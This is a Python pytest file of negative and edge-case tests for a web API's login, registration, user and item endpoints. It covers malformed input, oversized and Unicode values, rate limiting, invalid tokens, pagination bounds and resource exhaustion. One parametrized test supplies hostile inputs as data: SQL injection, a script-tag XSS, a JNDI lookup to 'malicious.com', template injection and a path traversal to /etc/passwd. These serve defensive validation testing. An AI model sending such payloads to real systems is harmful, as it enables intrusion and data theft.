"""Negative and pathological test cases for API endpoints."""
import pytest
import json
from typing import Dict, Any


class TestRequestValidationEdgeCases:
    """Test API request validation with edge cases."""
    
    @pytest.mark.parametrize("malformed_json", [
        '{"invalid": json}',  # Invalid JSON syntax
        '{"incomplete":}',     # Incomplete JSON
        '{"trailing": "comma",}',  # Trailing comma
        '{unclosed": "quote}',     # Unclosed quote
        '{"number": 123.}',        # Invalid number
    ])
    def test_malformed_json_requests(
        self,
        contract_client,
        contract_helper,
        malformed_json: str
    ):
        """Test endpoints handle malformed JSON gracefully."""
        # Send malformed JSON as raw data
        response = contract_client.post(
            "/api/v1/auth/login",
            content=malformed_json,
            headers={"content-type": "application/json"}
        )
        
        # Should return 400 or 422 for malformed JSON
        assert response.status_code in [400, 422]
        contract_helper.assert_error_response_format(response)
    
    @pytest.mark.parametrize("oversized_field", [
        "a" * 10001,  # Very long string
        "🚀" * 5000,  # Unicode characters
        "\x00" * 1000,  # Null bytes
    ])
    def test_oversized_request_fields(
        self,
        contract_client,
        contract_helper,
        oversized_field: str
    ):
        """Test endpoints handle oversized fields appropriately."""
        data = {
            "email": oversized_field + "@example.com",
            "password": "ValidPassword123!",
            "full_name": oversized_field
        }
        
        response = contract_client.post("/api/v1/auth/register", json=data)
        
        # Should reject oversized fields
        assert response.status_code in [400, 422, 413]
        contract_helper.assert_error_response_format(response)
    
    @pytest.mark.parametrize("null_injection", [
        {"email": None, "password": "test"},
        {"email": "test@example.com", "password": None},
        {"email": "", "password": ""},
        {"email": " ", "password": " "},  # Whitespace only
    ])
    def test_null_and_empty_value_handling(
        self,
        contract_client,
        contract_helper,
        null_injection: Dict[str, Any]
    ):
        """Test endpoints handle null and empty values correctly."""
        response = contract_client.post("/api/v1/auth/login", json=null_injection)
        
        # Should reject null/empty required fields
        assert response.status_code in [400, 422]
        contract_helper.assert_error_response_format(response)


class TestSecurityEdgeCases:
    """Test security-related edge cases."""
    
    @pytest.mark.parametrize("injection_attempt", [
        "admin'--",
        "admin';DROP TABLE users;--",
        "<script>alert('xss')</script>",
        "${jndi:ldap://malicious.com}",
        "{{7*7}}",  # Template injection
        "../../etc/passwd",  # Path traversal
    ])
    def test_injection_prevention(
        self,
        contract_client,
        contract_helper,
        injection_attempt: str
    ):
        """Test endpoints prevent various injection attacks."""
        data = {
            "email": injection_attempt + "@example.com",
            "password": injection_attempt,
            "full_name": injection_attempt
        }
        
        response = contract_client.post("/api/v1/auth/register", json=data)
        
        # Should handle injection attempts safely
        assert response.status_code in [400, 422]
        contract_helper.assert_error_response_format(response)
        
        # Response should not contain injection payload
        response_text = response.text.lower()
        assert "drop table" not in response_text
        assert "<script>" not in response_text
    
    def test_excessive_authentication_attempts(
        self,
        contract_client,
        contract_helper
    ):
        """Test rate limiting on authentication endpoints."""
        invalid_credentials = {
            "email": "nonexistent@example.com",
            "password": "wrongpassword"
        }
        
        # Make multiple failed login attempts
        responses = []
        for i in range(20):  # Attempt to trigger rate limiting
            response = contract_client.post("/api/v1/auth/login", json=invalid_credentials)
            responses.append(response.status_code)
        
        # Should either consistently fail with 401 or eventually rate limit
        for status in responses:
            assert status in [401, 429, 422]  # 429 = Too Many Requests
    
    def test_invalid_token_handling(
        self,
        contract_client,
        contract_helper
    ):
        """Test endpoints handle invalid authentication tokens."""
        invalid_tokens = [
            "invalid.jwt.token",
            "Bearer ",  # Empty token
            "Bearer invalid-token",
            "Bearer " + "a" * 500,  # Oversized token
            "Not-Bearer valid-token",  # Wrong scheme
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": token}
            response = contract_client.get("/api/v1/users/me", headers=headers)
            
            # Should reject invalid tokens with 401
            assert response.status_code == 401
            contract_helper.assert_error_response_format(response)


class TestBoundaryValueTesting:
    """Test boundary values for numeric and string inputs."""
    
    @pytest.mark.parametrize("page_value", [
        0,      # Below minimum
        -1,     # Negative
        -999,   # Large negative
        10000,  # Very large positive
        "abc",  # Non-numeric
        None,   # Null value
    ])
    def test_pagination_boundary_values(
        self,
        authenticated_contract_client,
        contract_helper,
        page_value
    ):
        """Test pagination parameters with boundary values."""
        if page_value is None:
            params = {"per_page": 10}
        else:
            params = {"page": page_value, "per_page": 10}
            
        response = authenticated_contract_client.get("/api/v1/users", params=params)
        
        if isinstance(page_value, int) and page_value <= 0:
            # Invalid page numbers should be rejected or corrected
            assert response.status_code in [400, 422] or (
                response.status_code == 200 and 
                contract_helper.assert_pagination_response(response)
            )
        elif page_value is not None and not isinstance(page_value, int):
            # Non-integer values should be rejected
            assert response.status_code in [400, 422]
    
    @pytest.mark.parametrize("per_page_value", [
        0,      # Zero items
        -1,     # Negative
        1000,   # Very large page size
        "invalid",  # Non-numeric
    ])
    def test_per_page_boundary_values(
        self,
        authenticated_contract_client,
        contract_helper,
        per_page_value
    ):
        """Test per_page parameter with boundary values."""
        if per_page_value is None:
            params = {"page": 1}
        else:
            params = {"page": 1, "per_page": per_page_value}
            
        response = authenticated_contract_client.get("/api/v1/users", params=params)
        
        if isinstance(per_page_value, int):
            if per_page_value <= 0:
                # Invalid per_page should be rejected or defaulted
                assert response.status_code in [400, 422] or (
                    response.status_code == 200 and
                    contract_helper.assert_pagination_response(response)
                )
            elif per_page_value > 100:  # Assuming max page size is 100
                # Large page sizes should be capped or rejected
                if response.status_code == 200:
                    data = contract_helper.assert_pagination_response(response)
                    assert data["per_page"] <= 100
        elif per_page_value is not None:
            # Non-integer values should be rejected
            assert response.status_code in [400, 422]


class TestConcurrencyAndRaceConditions:
    """Test endpoints under concurrent access scenarios."""
    
    def test_duplicate_user_creation(
        self,
        contract_client,
        contract_helper
    ):
        """Test creating duplicate users simultaneously."""
        user_data = {
            "email": "duplicate-test@example.com",
            "password": "TestPassword123!",
            "full_name": "Duplicate Test"
        }
        
        # First creation should succeed
        response1 = contract_client.post("/api/v1/auth/register", json=user_data)
        
        # Second creation should fail with conflict
        response2 = contract_client.post("/api/v1/auth/register", json=user_data)
        
        # One should succeed, one should fail
        statuses = {response1.status_code, response2.status_code}
        
        # Should have success (200/201) and conflict (409) or validation error
        assert 200 in statuses or 201 in statuses
        assert 409 in statuses or 400 in statuses or 422 in statuses
    
    def test_concurrent_item_operations(
        self,
        authenticated_contract_client,
        contract_helper
    ):
        """Test concurrent operations on the same resource."""
        # Create an item first
        item_data = {
            "title": "Concurrent Test Item",
            "description": "Test concurrent operations"
        }
        
        create_response = authenticated_contract_client.post("/api/v1/items", json=item_data)
        
        if create_response.status_code == 201:
            item_id = create_response.json()["id"]
            
            # Try to delete the same item multiple times
            delete_responses = []
            for _ in range(3):
                response = authenticated_contract_client.delete(f"/api/v1/items/{item_id}")
                delete_responses.append(response.status_code)
            
            # First delete should succeed, subsequent should fail
            assert 200 in delete_responses or 204 in delete_responses  # Success
            assert 404 in delete_responses  # Not found on subsequent attempts


class TestProtocolAndEncodingEdgeCases:
    """Test protocol and encoding edge cases."""
    
    @pytest.mark.parametrize("content_type", [
        "application/json; charset=utf-16",
        "text/plain",
        "application/xml",
        "multipart/form-data",
        "",  # Empty content type
        "application/json; boundary=something",
    ])
    def test_content_type_handling(
        self,
        contract_client,
        contract_helper,
        content_type: str
    ):
        """Test endpoints handle various content types appropriately."""
        data = '{"email": "test@example.com", "password": "test"}'
        
        headers = {"content-type": content_type} if content_type else {}
        
        response = contract_client.post(
            "/api/v1/auth/login",
            content=data,
            headers=headers
        )
        
        if content_type.startswith("application/json"):
            # JSON content types should be processed
            assert response.status_code in [200, 400, 401, 422]
        else:
            # Non-JSON content types should be rejected
            assert response.status_code in [400, 415, 422]  # 415 = Unsupported Media Type
    
    @pytest.mark.parametrize("encoding_test", [
        {"email": "test@例え.テスト", "password": "パスワード"},  # Japanese
        {"email": "тест@примеp.ком", "password": "пароль"},     # Cyrillic
        {"email": "test@مثال.كوم", "password": "كلمة مرور"},       # Arabic
        {"email": "test@😀.com", "password": "🔐secure"},        # Emoji
    ])
    def test_unicode_handling(
        self,
        contract_client,
        contract_helper,
        encoding_test: Dict[str, str]
    ):
        """Test endpoints handle Unicode characters correctly."""
        response = contract_client.post("/api/v1/auth/login", json=encoding_test)
        
        # Should handle Unicode gracefully
        assert response.status_code in [400, 401, 422]
        contract_helper.assert_error_response_format(response)
        
        # Response should be valid JSON
        contract_helper.assert_json_response(response)


class TestResourceExhaustionPrevention:
    """Test prevention of resource exhaustion attacks."""
    
    def test_deeply_nested_json(
        self,
        contract_client,
        contract_helper
    ):
        """Test endpoints handle deeply nested JSON structures."""
        # Create deeply nested JSON
        nested_data: Dict[str, Any] = {"level": 1}
        current: Dict[str, Any] = nested_data
        
        for i in range(2, 100):  # Create 99 levels of nesting
            current["nested"] = {"level": i}
            current = current["nested"]  # type: ignore
        
        response = contract_client.post("/api/v1/auth/login", json=nested_data)
        
        # Should handle or reject deeply nested structures
        assert response.status_code in [400, 413, 422]
        contract_helper.assert_error_response_format(response)
    
    def test_large_array_handling(
        self,
        contract_client,
        contract_helper
    ):
        """Test endpoints handle large arrays appropriately."""
        # Create large array
        large_array = ["item"] * 10000
        data = {"items": large_array, "email": "test@example.com"}
        
        response = contract_client.post("/api/v1/auth/login", json=data)
        
        # Should handle or reject large arrays
        assert response.status_code in [400, 413, 422]
        contract_helper.assert_error_response_format(response)
    
    def test_extremely_long_url_paths(
        self,
        contract_client,
        contract_helper
    ):
        """Test endpoints handle extremely long URL paths."""
        # Create very long path
        long_path = "a" * 5000
        
        response = contract_client.get(f"/api/v1/users/{long_path}")
        
        # Should handle long paths gracefully
        assert response.status_code in [400, 404, 414, 422]  # 414 = URI Too Long
        
        if response.status_code not in [414]:  # 414 might not return JSON
            contract_helper.assert_error_response_format(response)